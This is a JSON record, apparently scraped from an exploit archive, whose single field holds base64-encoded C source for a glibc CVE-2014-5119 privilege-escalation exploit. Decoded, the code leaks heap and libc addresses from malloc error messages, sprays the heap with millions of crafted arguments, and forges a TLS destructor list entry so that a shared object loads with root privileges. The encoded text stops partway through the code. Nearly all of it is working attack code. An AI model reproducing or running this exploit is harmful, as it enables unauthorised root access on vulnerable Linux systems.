{
    "source": "exploit-database", 
    "exploit": "Ly8NCi8vIEZ1bGwgRXhwbG9pdDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvc3Bsb2l0cy8zNDQyMS50YXIuZ3ogKENWRS0yMDE0LTUxMTkudGFyLmd6KQ0KLy8NCi8vDQovLyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCi8vIENWRS0yMDE0LTUxMTkgZ2xpYmMgX19nY29udl90cmFuc2xpdF9maW5kKCkgZXhwbG9pdA0KLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIHRhdmlzbyAmIHNjYXJ5YmVhc3RzIC0tLS0tDQovLw0KLy8gVGF2aXMgT3JtYW5keSA8dGF2aXNvQGNtcHhoZzhiLmNvbT4NCi8vIENocmlzIEV2YW5zICAgPHNjYXJ5YmVhc3RzQGdtYWlsLmNvbT4NCi8vDQovLyBNb25kYXkgMjV0aCBBdWd1c3QsIDIwMTQNCi8vDQoNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCiNpbmNsdWRlIDxlcnIuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxkbGZjbi5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPGFzc2VydC5oPg0KI2luY2x1ZGUgPHN0ZGFyZy5oPg0KI2luY2x1ZGUgPHN0ZGRlZi5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHRlcm1pb3MuaD4NCiNpbmNsdWRlIDxzdGRib29sLmg+DQojaW5jbHVkZSA8c3lzL3VzZXIuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy9pb2N0bC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4NCiNpbmNsdWRlIDxzeXMvdXRzbmFtZS5oPg0KI2luY2x1ZGUgPHN5cy9yZXNvdXJjZS5oPg0KDQovLyBNaW5pbWFsIGVudmlyb25tZW50IHRvIHRyaWdnZXIgY29ycnVwdGlvbiBpbiBfX2djb252X3RyYW5zbGl0X2ZpbmQoKS4NCnN0YXRpYyBjaGFyICogY29uc3Qga0NvcnJ1cHRDaGFyc2V0RW52aXJvbltdID0gew0KICAgICJDSEFSU0VUPS8vQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiLA0KICAgIE5VTEwsDQp9Ow0KDQpzdGF0aWMgY29uc3Qgc3RydWN0IHJsaW1pdCBrUmxpbU1heCA9IHsNCiAgICAucmxpbV9jdXIgPSBSTElNX0lORklOSVRZLA0KICAgIC5ybGltX21heCA9IFJMSU1fSU5GSU5JVFksDQp9Ow0KDQpzdGF0aWMgY29uc3Qgc3RydWN0IHJsaW1pdCBrUmxpbU1pbiA9IHsNCiAgICAucmxpbV9jdXIgPSAxLA0KICAgIC5ybGltX21heCA9IDEsDQp9Ow0KDQovLyBBIG1hbGxvYyBjaHVuayBoZWFkZXIuDQp0eXBlZGVmIHN0cnVjdCB7DQogICAgc2l6ZV90ICAgIHByZXZfc2l6ZTsNCiAgICBzaXplX3QgICAgc2l6ZTsNCiAgICB1aW50cHRyX3QgZmQ7DQogICAgdWludHB0cl90IGJrOw0KICAgIHVpbnRwdHJfdCBmZF9uZXh0c2l6ZTsNCiAgICB1aW50cHRyX3QgYmtfbmV4dHNpemU7DQp9IG1jaHVua190Ow0KDQovLyBBIHRsc19kdG9yX2xpc3Qgbm9kZS4NCnR5cGVkZWYgc3RydWN0IHsNCiAgICB1aW50cHRyX3QgICBmdW5jOw0KICAgIHVpbnRwdHJfdCAgIG9iajsNCiAgICB1aW50cHRyX3QgICBtYXA7DQogICAgdWludHB0cl90ICAgbmV4dDsNCn0gZGxpc3RfdDsNCg0KLy8gVGhlIGtub3duX3RyYW5zIHN0cnVjdHVyZSBnbGliYyB1c2VzIGZvciB0cmFuc2xpdGVyYXRpb24gbW9kdWxlcy4NCnR5cGVkZWYgc3RydWN0IHsNCiAgICB1aW50OF90ICAgIGluZm9bMzJdOw0KICAgIGNoYXIgICAgICAqZm5hbWU7DQogICAgdm9pZCAgICAgICpoYW5kbGU7DQogICAgaW50ICAgICAgICBvcGVuX2NvdW50Ow0KfSBrbm93bl90Ow0KDQplbnVtIHsNCiAgICBMT0dfREVCVUcsDQogICAgTE9HX1dBUk4sDQogICAgTE9HX0VSUk9SLA0KICAgIExPR19GQVRBTCwNCn07DQoNCi8vIFJvdW5kIHVwIGFuIGludGVnZXIgdG8gdGhlIG5leHQgUEFHRV9TSVpFIGJvdW5kYXJ5Lg0Kc3RhdGljIGlubGluZSB1aW50cHRyX3QgbmV4dF9wYWdlX3NpemUodWludHB0cl90IHNpemUpDQp7DQogICAgcmV0dXJuIChzaXplICsgUEFHRV9TSVpFIC0gMSkgJiBQQUdFX01BU0s7DQp9DQoNCi8vIEFsbG9jYXRlIGEgYnVmZmVyIG9mIHNwZWNpZmllZCBsZW5ndGgsIHN0YXJ0aW5nIHdpdGggcywgY29udGFpbmluZyBjLCB0ZXJtaW5hdGVkIHdpdGggdC4NCnN0YXRpYyB2b2lkICogYWxsb2NfcmVwZWF0ZWRfc3RyaW5nKHNpemVfdCBsZW5ndGgsIGludCBzLCBpbnQgYywgaW50IHQpDQp7DQogICAgcmV0dXJuIG1lbXNldChtZW1zZXQobWVtc2V0KG1hbGxvYyhsZW5ndGgpLCB0LCBsZW5ndGgpLCBjLCBsZW5ndGggLSAxKSwgcywgMSk7DQp9DQoNCnN0YXRpYyB2b2lkIGxvZ21lc3NhZ2UoaW50IGxldmVsLCBjb25zdCBjaGFyICogZm9ybWF0LCAuLi4pDQp7DQogICAgdmFfbGlzdCBhcDsNCg0KICAgIHN3aXRjaCAobGV2ZWwpIHsNCiAgICAgICAgY2FzZSBMT0dfREVCVUc6IGZwcmludGYoc3RkZXJyLCAiWypdICIpOyBicmVhazsNCiAgICAgICAgY2FzZSBMT0dfV0FSTjogIGZwcmludGYoc3RkZXJyLCAiWypdICIpOyBicmVhazsNCiAgICAgICAgY2FzZSBMT0dfRVJST1I6IGZwcmludGYoc3RkZXJyLCAiWyFdICIpOyBicmVhazsNCiAgICB9DQoNCiAgICB2YV9zdGFydChhcCwgZm9ybWF0KTsNCiAgICAgICAgdmZwcmludGYoc3RkZXJyLCBmb3JtYXQsIGFwKTsNCiAgICB2YV9lbmQoYXApOw0KDQogICAgZnB1dGMoJ1xuJywgc3RkZXJyKTsNCg0KICAgIGlmIChsZXZlbCA9PSBMT0dfRVJST1IpIHsNCiAgICAgICAgX2V4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQp9DQoNCi8vIFBhcnNlIGEgbGliYyBtYWxsb2MgYXNzZXJ0aW9uIG1lc3NhZ2UgdG8gZXh0cmFjdCB1c2VmdWwgcG9pbnRlcnMuDQovLw0KLy8gTm90ZSwgdGhpcyBpc24ndCB0byBkZWZlYXQgQVNMUiwgaXQganVzdCBtYWtlcyBpdCBtb3JlIHBvcnRhYmxlIGFjcm9zcw0KLy8gZGlmZmVyZW50IHN5c3RlbSBjb25maWd1cmF0aW9ucy4gQVNMUiBpcyBhbHJlYWR5IG51bGxpZmllZCB1c2luZyBybGltaXRzLA0KLy8gYWx0aG91Z2ggdGVjaG5pY2FsbHkgZXZlbiB0aGF0IGlzbid0IG5lY2Vzc2FyeS4NCnN0YXRpYyBpbnQgcGFyc2VfZmF0YWxfZXJyb3IodWludHB0cl90ICpjaHVua3B0ciwgdWludHB0cl90ICpiYXNlYWRkciwgdWludHB0cl90ICpic3NhZGRyLCB1aW50cHRyX3QgKmxpYmNhZGRyKQ0Kew0KICAgIEZJTEUgKnB0eTsNCiAgICBjaGFyICptYWxsb2NlcnJvcjsNCiAgICBjaGFyICptZW1vcnltYXA7DQogICAgY2hhciAqbGluZTsNCiAgICBjaGFyICpwcmV2Ow0KICAgIGNoYXIgbWVzc2FnZVsxIDw8IDE0XTsNCiAgICBjaGFyICphbm9uID0gTlVMTDsNCiAgICBjaGFyIHIsIHcsIHgsIHM7DQogICAgc3NpemVfdCBjb3VudDsNCiAgICBpbnQgc3RhdHVzOw0KICAgIHVpbnRwdHJfdCBtYXBzdGFydDsNCiAgICB1aW50cHRyX3QgbWFwZW5kOw0KDQogICAgLy8gVW5mb3J0dW5hdGVseSwgZ2xpYmMgd3JpdGVzIGl0J3MgZXJyb3IgbWVzc2FnZWQgdG8gL2Rldi90dHkuIFRoaXMgY2Fubm90DQogICAgLy8gYmUgY2hhbmdlZCBpbiBzZXR1aWQgcHJvZ3JhbXMsIHNvIHRoaXMgd3JhcHBlciBjYXRjaGVzIHR0eSBvdXRwdXQuDQogICAgd2hpbGUgKHRydWUpIHsNCiAgICAgICAgLy8gUmVzZXQgYW55IHByZXZpb3VzIG91dHB1dC4NCiAgICAgICAgbWVtc2V0KG1lc3NhZ2UsIDAsIHNpemVvZiBtZXNzYWdlKTsNCg0KICAgICAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgIkF0dGVtcHRpbmcgdG8gaW52b2tlIHBzZXVkby1wdHkgaGVscGVyICh0aGlzIHdpbGwgdGFrZSBhIGZldyBzZWNvbmRzKS4uLiIpOw0KDQogICAgICAgIGlmICgocHR5ID0gcG9wZW4oIi4vcHR5IiwgInIiKSkgPT0gTlVMTCkgew0KICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfRVJST1IsICJmYWlsZWQgdG8gZXhlY3V0ZSBwc2V1ZG8tcHR5IGhlbHBlciB1dGlsaXR5LCBjYW5ub3QgY29udGludWUiKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoY291bnQgPSBmcmVhZChtZXNzYWdlLCAxLCBzaXplb2YgbWVzc2FnZSwgcHR5KSkgPD0gMCkgew0KICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfRVJST1IsICJmYWlsZWQgdG8gcmVhZCBvdXRwdXQgZnJvbSBwc2V1ZG8tcHR5IGhlbHBlciwgJWQgKCVtKSIsIGNvdW50LCBtZXNzYWdlKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiUmVhZCAldSBieXRlcyBvZiBvdXRwdXQgZnJvbSBwc2V1ZG8tcHR5IGhlbHBlciwgcGFyc2luZy4uLiIsIGNvdW50KTsNCg0KICAgICAgICBwY2xvc2UocHR5KTsNCg0KICAgICAgICBtYWxsb2NlcnJvciA9IHN0cnN0cihtZXNzYWdlLCAiY29ycnVwdGVkIGRvdWJsZS1saW5rZWQgbGlzdCIpOw0KICAgICAgICBtZW1vcnltYXAgPSBzdHJzdHIobWVzc2FnZSwgIj09PT09PT0gTWVtb3J5IG1hcDogPT09PT09PT0iKTsNCg0KICAgICAgICAvLyBVbmZvcnR1bmF0ZWx5IHRoaXMgaXNuJ3QgcmVsaWFibGUsIGtlZXAgdHJ5aW5nIHVudGlsIGl0IHdvcmtzLg0KICAgICAgICBpZiAobWFsbG9jZXJyb3IgPT0gTlVMTCB8fCBtZW1vcnltYXAgPT0gTlVMTCkgew0KICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfV0FSTiwgImV4cGVjdGVkIG91dHB1dCBtaXNzaW5nICh0aGlzIGlzIG5vcm1hbCksIHRyeWluZyBhZ2Fpbi4uLiIpOw0KICAgICAgICAgICAgY29udGludWU7DQogICAgICAgIH0NCg0KICAgICAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgInBzZXVkby1wdHkgaGVscGVyIHN1Y2NlZWRlZCIpOw0KICAgICAgICBicmVhazsNCiAgICB9DQoNCiAgICAqYmFzZWFkZHIgPSAwOw0KICAgICpjaHVua3B0ciA9IDA7DQogICAgKmJzc2FkZHIgID0gMDsNCiAgICAqbGliY2FkZHIgPSAwOw0KDQogICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICJhdHRlbXB0aW5nIHRvIHBhcnNlIGxpYmMgZmF0YWwgZXJyb3IgbWVzc2FnZS4uLiIpOw0KDQogICAgLy8gVmVyaWZ5IHRoaXMgaXMgYSBtZXNzYWdlIHdlIHVuZGVyc3RhbmQuDQogICAgaWYgKCFtYWxsb2NlcnJvciB8fCAhbWVtb3J5bWFwKSB7DQogICAgICAgIGxvZ21lc3NhZ2UoTE9HX0VSUk9SLCAidW5hYmxlIHRvIGxvY2F0ZSByZXF1aXJlZCBlcnJvciBtZXNzYWdlcyBpbiBjcmFzaCBkdW1wIik7DQogICAgfQ0KDQogICAgLy8gRmlyc3QsIGZpbmQgdGhlIGNodW5rIHBvaW50ZXIgdGhhdCBtYWxsb2MgZG9lc24ndCBsaWtlDQogICAgaWYgKHNzY2FuZihtYWxsb2NlcnJvciwgImNvcnJ1cHRlZCBkb3VibGUtbGlua2VkIGxpc3Q6ICVwICoqKiIsIGNodW5rcHRyKSAhPSAxKSB7DQogICAgICAgIGxvZ21lc3NhZ2UoTE9HX0VSUk9SLCAiaGF2aW5nIHRyb3VibGUgcGFyc2luZyB0aGlzIGVycm9yIG1lc3NhZ2U6ICUuMjBzIiwgbWFsbG9jZXJyb3IpOw0KICAgIH07DQoNCiAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgImRpc2NvdmVyZWQgY2h1bmsgcG9pbnRlciBmcm9tIGAlLjIwcy4uLmAsID0+ICVwIiwgbWFsbG9jZXJyb3IsICpjaHVua3B0cik7DQogICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICJhdHRlbXB0aW5nIHRvIHBhcnNlIHRoZSBsaWJjIG1hcHMgZHVtcC4uLiIpOw0KDQogICAgLy8gU2Vjb25kLCBwYXJzZSBtYXBzLg0KICAgIGZvciAocHJldiA9IGxpbmUgPSBtZW1vcnltYXA7IGxpbmUgPSBzdHJ0b2sobGluZSwgIlxuIik7IHByZXYgPSBsaW5lLCBsaW5lID0gTlVMTCkgew0KICAgICAgICBjaGFyIGZpbGVuYW1lWzMyXTsNCg0KICAgICAgICAvLyBSZXNldCBmaWxlbmFtZS4NCiAgICAgICAgbWVtc2V0KGZpbGVuYW1lLCAwLCBzaXplb2YgZmlsZW5hbWUpOw0KDQogICAgICAgIC8vIEp1c3QgaWdub3JlIHRoZSBiYW5uZXIgcHJpbnRlZCBieSBnbGliYy4NCiAgICAgICAgaWYgKHN0cmNtcChsaW5lLCAiPT09PT09PSBNZW1vcnkgbWFwOiA9PT09PT09PSIpID09IDApIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKHNzY2FuZihsaW5lLCAiJTA4eC0lMDh4ICVjJWMlYyVjICUqOHggJSpzICUqdSAlMzFzIiwgJm1hcHN0YXJ0LCAmbWFwZW5kLCAmciwgJncsICZ4LCAmcywgZmlsZW5hbWUpID49IDEpIHsNCiAgICAgICAgICAgIC8vIFJlY29yZCB0aGUgbGFzdCBzZWVuIGFub255bW91cyBtYXAsIGluIGNhc2UgdGhlIGtlcm5lbCBkaWRuJ3QgdGFnIHRoZSBoZWFwLg0KICAgICAgICAgICAgaWYgKHN0cmxlbihmaWxlbmFtZSkgPT0gMCkgew0KICAgICAgICAgICAgICAgIGFub24gPSBsaW5lOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBJZiB0aGUga2VybmVsIGRpZCB0YWcgdGhlIGhlYXAsIHRoZW4gZXZlcnl0aGluZyBpcyBlYXN5Lg0KICAgICAgICAgICAgaWYgKHN0cmNtcChmaWxlbmFtZSwgIltoZWFwXSIpID09IDApIHsNCiAgICAgICAgICAgICAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgInN1Y2Nlc3NmdWxseSBsb2NhdGVkIGZpcnN0IG1vcmVjb3JlIGNodW5rIHcvdGFnIEAlcCIsIG1hcHN0YXJ0KTsNCiAgICAgICAgICAgICAgICAqYmFzZWFkZHIgPSBtYXBzdGFydDsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8gSWYgaXQgZGlkbid0IHRhZyB0aGUgaGVhcCwgdGhlbiB3ZSBuZWVkIHRoZSBhbm9ueW1vdXMgY2h1bmsgYmVmb3JlIHRoZSBzdGFjay4NCiAgICAgICAgICAgIGlmIChzdHJjbXAoZmlsZW5hbWUsICJbc3RhY2tdIikgPT0gMCAmJiAhKmJhc2VhZGRyKSB7DQogICAgICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfV0FSTiwgIm5vIFtoZWFwXSB0YWcgd2FzIGZvdW5kLCB1c2luZyBoZXVyaXN0aWMuLi4iKTsNCiAgICAgICAgICAgICAgICBpZiAoc3NjYW5mKGFub24sICIlMDh4LSUqMDh4ICUqYyUqYyUqYyUqYyAlKjh4ICUqcyAlKnUgJTMxcyIsIGJhc2VhZGRyLCBmaWxlbmFtZSkgPCAxKSB7DQogICAgICAgICAgICAgICAgICAgIGxvZ21lc3NhZ2UoTE9HX0VSUk9SLCAiZXhwZWN0ZWQgdG8gZmluZCBoZWFwIGxvY2F0aW9uIGluIGxpbmUgYCVzYCwgYnV0IGZhaWxlZCIsIGFub24pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgImxvY2F0ZWQgZmlyc3QgbW9yZWNvcmUgY2h1bmsgdy9vIHRhZ0AlcCIsICpiYXNlYWRkcik7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmIChzdHJjbXAoZmlsZW5hbWUsICIvdXNyL2xpYi9saWJjLTIuMTguc28iKSA9PSAwICYmIHggPT0gJ3gnKSB7DQogICAgICAgICAgICAgICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICJmb3VuZCBsaWJjLnNvIG1hcHBlZCBAJXAiLCBtYXBzdGFydCk7DQogICAgICAgICAgICAgICAgKmxpYmNhZGRyID0gbWFwc3RhcnQ7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRyeSB0byBmaW5kIGxpYmMgYnNzLg0KICAgICAgICAgICAgaWYgKHN0cmxlbihmaWxlbmFtZSkgPT0gMCAmJiBtYXBlbmQgLSBtYXBzdGFydCA9PSAweDEwMjAwMCkgew0KICAgICAgICAgICAgICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiZXhwZWN0aW5nIGxpYmMuc28gYnNzIHRvIGJlZ2luIGF0ICVwIiwgbWFwc3RhcnQpOw0KICAgICAgICAgICAgICAgICpic3NhZGRyID0gbWFwc3RhcnQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGxvZ21lc3NhZ2UoTE9HX0VSUk9SLCAidW5hYmxlIHRvIHBhcnNlIG1hcHMgbGluZSBgJXNgLCBxdWl0aW5nIiwgbGluZSk7DQogICAgICAgIGJyZWFrOw0KICAgIH0NCg0KICAgIHJldHVybiAoKmNodW5rcHRyID09IDAgfHwgKmJhc2VhZGRyID09IDAgfHwgKmJzc2FkZHIgPT0gMCB8fCAqbGliY2FkZHIgPT0gMCkgPyAxIDogMDsNCn0NCg0Kc3RhdGljIGNvbnN0IHNpemVfdCBoZWFwX2NodW5rX3N0YXJ0ID0gMHg1MDZjODAwODsNCnN0YXRpYyBjb25zdCBzaXplX3QgaGVhcF9jaHVua19lbmQgICA9IDB4NTA2YzgwMDggKyAoMiAqIDEwMjQgKiAxMDI0KTsNCg0Kc3RhdGljIGNvbnN0IHNpemVfdCBuc3RyaW5ncyA9IDE1ODQwMDAwOw0KDQovLyBUaGUgb2Zmc2V0IGludG8gbGliYy0yLjE4LnNvIEJTUyBvZiB0bHNfZHRvcl9saXN0Lg0Kc3RhdGljIGNvbnN0IHVpbnRwdHJfdCBrVGxzRHRvckxpc3RPZmZzZXQgPSAweDEyZDQ7DQoNCi8vIFRoZSBEU08gd2Ugd2FudCB0byBsb2FkIGFzIGV1aWQgMC4NCnN0YXRpYyBjb25zdCBjaGFyIGtFeHBsb2l0RHNvW10gPSAiLi9leHBsb2l0LnNvIjsNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNvbnN0IGNoYXIqIGFyZ3ZbXSkNCnsNCiAgICB1aW50cHRyX3QgYmFzZWFkZHI7DQogICAgdWludHB0cl90IGNodW5rcHRyOw0KICAgIHVpbnRwdHJfdCBic3NhZGRyOw0KICAgIHVpbnRwdHJfdCBsaWJjYWRkcjsNCiAgICB1aW50OF90ICAqcGFyYW07DQogICAgY2hhciAgICAqKmFyZ3M7DQogICAgZGxpc3RfdCAgKmNoYWluOw0KICAgIHN0cnVjdCB1dHNuYW1lIHVidWY7DQoNCiAgICAvLyBMb29rIHVwIGhvc3QgdHlwZS4NCiAgICBpZiAodW5hbWUoJnVidWYpICE9IDApIHsNCiAgICAgICAgbG9nbWVzc2FnZShMT0dfRVJST1IsICJmYWlsZWQgdG8gcXVlcnkga2VybmVsIGluZm9ybWF0aW9uIik7DQogICAgfQ0KDQogICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTsNCiAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgIkNWRS0yMDE0LTUxMTkgZ2xpYmMgX19nY29udl90cmFuc2xpdF9maW5kKCkgZXhwbG9pdCIpOw0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIHRhdmlzbyAmIHNjYXJ5YmVhc3RzIC0tLS0tIik7DQoNCiAgICAvLyBQcmludCBzb21lIHdhcm5pbmcgdGhhdCB0aGlzIGlzbid0IGdvaW5nIHRvIHdvcmsgb24gVWJ1bnR1Lg0KICAgIGlmIChhY2Nlc3MoIi9ldGMvZmVkb3JhLXJlbGVhc2UiLCBGX09LKSAhPSAwIHx8IHN0cmNtcCh1YnVmLm1hY2hpbmUsICJpNjg2IikgIT0gMCkNCiAgICAgICAgbG9nbWVzc2FnZShMT0dfV0FSTiwgIlRoaXMgcHJvb2Ygb2YgY29uY2VwdCBpcyBkZXNpZ25lZCBmb3IgMzIgYml0IEZlZG9yYSAyMCIpOw0KDQogICAgLy8gRXh0cmFjdCBzb21lIHVzZWZ1bCBwb2ludGVycyBmcm9tIGdsaWJjIGVycm9yIG91dHB1dC4NCiAgICBpZiAocGFyc2VfZmF0YWxfZXJyb3IoJmNodW5rcHRyLCAmYmFzZWFkZHIsICZic3NhZGRyLCAmbGliY2FkZHIpICE9IDApIHsNCiAgICAgICAgbG9nbWVzc2FnZShMT0dfRVJST1IsICJ1bmFibGUgdG8gcGFyc2UgbGliYyBmYXRhbCBlcnJvciBtZXNzYWdlLCBwbGVhc2UgdHJ5IGFnYWluLiIpOw0KICAgIH0NCg0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiYWxsb2NhdGluZyBzcGFjZSBmb3IgYXJndW1lbnQgc3RydWN0dXJlLi4uIik7DQoNCiAgICAvLyBUaGlzIG51bWJlciBvZiAiLXUiIGFyZ3VtZW50cyBpcyB1c2VkIHRvIHNwcmF5IHRoZSBoZWFwLg0KICAgIC8vIEVhY2ggdmFsdWUgaXMgYSA1OS1ieXRlIHN0cmluZywgbGVhZGluZyB0byBhIDY0LWJ5dGUgaGVhcCBjaHVuaywgbGVhZGluZyB0byBhIHN0YWJsZSBoZWFwIHBhdHRlcm4uDQogICAgLy8gVGhlIHZhbHVlIGlzIGp1c3QgbGFyZ2UgZW5vdWdoIHRvIHVzdWF1bGx5IGNyYXNoIHRoZSBoZWFwIGludG8gdGhlIHN0YWNrIHdpdGhvdXQgZ29pbmcgT09NLg0KICAgIGlmICgoYXJncyA9IG1hbGxvYygoKG5zdHJpbmdzICogMiArIDMpICogc2l6ZW9mKGNoYXIgKikpKSkgPT0gTlVMTCkgew0KICAgICAgICBsb2dtZXNzYWdlKExPR19FUlJPUiwgImFsbG9jYXRpbmcgYXJndW1lbnQgc3RydWN0dXJlIGZhaWxlZCIpOw0KICAgIH0NCg0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiY3JlYXRpbmcgY29tbWFuZCBzdHJpbmcuLi4iKTsNCg0KICAgIGFyZ3NbbnN0cmluZ3MgKiAyICsgMV0gPSBhbGxvY19yZXBlYXRlZF9zdHJpbmcoNDcxLCAnLycsIDEsIDApOw0KICAgIGFyZ3NbbnN0cmluZ3MgKiAyICsgMl0gPSBOVUxMOw0KDQogICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICJjcmVhdGluZyBhIHRsc19kdG9yX2xpc3Qgbm9kZS4uLiIpOw0KDQogICAgLy8gVGhlIGxlbmd0aCA1OSBpcyBjaG9zZW4gdG8gY2F1c2UgYSA2NGJ5dGUgYWxsb2NhdGlvbiBieSBzdGRydXAuIFRoYXQgaXMNCiAgICAvLyBhIDYwIGJ5dGUgbnVsLXRlcm1pbmF0ZWQgc3RyaW5nLCBmb2xsb3dlZCBieSA0IGJ5dGVzIG9mIG1ldGFkYXRhLg0KICAgIHBhcmFtID0gYWxsb2NfcmVwZWF0ZWRfc3RyaW5nKDU5LCAnQScsICdBJywgMCk7DQogICAgY2hhaW4gPSAodm9pZCAqKSBwYXJhbTsNCg0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAib3Blbl90cmFuc2xpdCgpIHN5bWJvbCB3aWxsIGJlIGF0ICVwIiwgbGliY2FkZHIgKyBfT1BFTl9UUkFOU0xJVF9PRkYpOw0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAib2Zmc2V0b2Yoc3RydWN0IGtub3duX3RyYW5zLCBmbmFtZSkgPT4gJXUiLCBvZmZzZXRvZihrbm93bl90LCBmbmFtZSkpOw0KDQogICAgY2hhaW4tPmZ1bmMgPSBsaWJjYWRkciArIF9PUEVOX1RSQU5TTElUX09GRjsNCiAgICBjaGFpbi0+b2JqICA9IGJhc2VhZGRyICsgOCArIHNpemVvZigqY2hhaW4pIC0gNCAtIG9mZnNldG9mKGtub3duX3QsIGZuYW1lKTsNCiAgICBjaGFpbi0+bWFwICA9IGJhc2VhZGRyICsgOCArIHNpemVvZigqY2hhaW4pOw0KICAgIGNoYWluLT5uZXh0ID0gYmFzZWFkZHIgKyA4ICsgNTkgLSBzdHJsZW4oa0V4cGxvaXREc28pOw0KDQogICAgbG9nbWVzc2FnZShMT0dfREVCVUcsICJhcHBlbmRpbmcgYCVzYCB0byBsaXN0IG5vZGUiLCBrRXhwbG9pdERzbyk7DQoNCiAgICBtZW1jcHkocGFyYW0gKyA1OSAtIHN0cmxlbihrRXhwbG9pdERzbyksIGtFeHBsb2l0RHNvLCAxMik7DQoNCiAgICBsb2dtZXNzYWdlKExPR19ERUJVRywgImJ1aWxkaW5nIHBhcmFtZXRlciBsaXN0Li4uIik7DQogICAgZm9yIChpbnQgaSA9IDA7IGkgPCBuc3RyaW5nczsgKytpKSB7DQogICAgICAgIGFyZ3NbaSoyICsgMV0gPSAiLXUiOw0KICAgICAgICBhcmdzW2kqMiArIDJdID0gKHZvaWQgKikgY2hhaW47DQogICAgfQ0KDQogICAgLy8gVmVyaWZ5IHdlIGRpZG4ndCBzbmVhayBpbiBhIE5VTC4NCiAgICBhc3NlcnQobWVtY2hyKGNoYWluLCAwLCBzaXplb2YoY2hhaW4pKSA9PSBOVUxMKTsNCg0KICAgIGxvZ21lc3NhZ2UoTE9HX0RFQlVHLCAiYW50aWNpcGF0aW5nIHRsc19kdG9yX2xpc3QgdG8gYmUgYXQgJXAiLCBic3NhZGRyICsga1Rsc0R0b3JMaXN0T2Zmc2V0KTsNCg0KICAgIC8vIFNwYW0gYWxsIG9mIHBvc3NpYmxlIGNodW5rcyAoc29tZSBhcmUgdW5mb3J0dW5hdGVseSBtaXNzZWQpLg0KICAgIGZvciAoaW50IGkgPSAwOyB0cnVlOyBpKyspIHsNCiAgICAgICAgdWludHB0cl90IGNodW5rc2l6ZSAgICAgICAgID0gNjQ7DQogICAgICAgIHVpbnRwdHJfdCBjaHVua2FkZHIgICAgICAgICA9IGJhc2VhZGRyICsgaSAqIGNodW5rc2l6ZTsNCiAgICAgICAgdWludHB0cl90IHRhcmdldHBhZ2VvZmZzZXQgID0gY2h1bmtwdHIgJiB+UEFHRV9NQVNLOw0KICAgICAgICB1aW50cHRyX3QgY2h1bmtwYWdlb2Zmc2V0ICAgPSBQQUdFX01BU0s7DQogICAgICAgIHVpbnRwdHJfdCBtbWFwYmFzZSAgICAgICAgICA9IDMxODA0ICsgKCgweEZEOCAtIHRhcmdldHBhZ2VvZmZzZXQpIC8gMzIpOw0KICAgICAgICB1aW50OF90ICAqcGFyYW0gICAgICAgICAgICAgPSBOVUxMOw0KICAgICAgICBtY2h1bmtfdCBjaHVuayAgICAgICAgICAgICAgPSB7DQogICAgICAgICAgICAucHJldl9zaXplICAgICAgICAgICAgICA9IDB4Q0NDQ0NDQ0MsDQogICAgICAgICAgICAuc2l6ZSAgICAgICAgICAgIC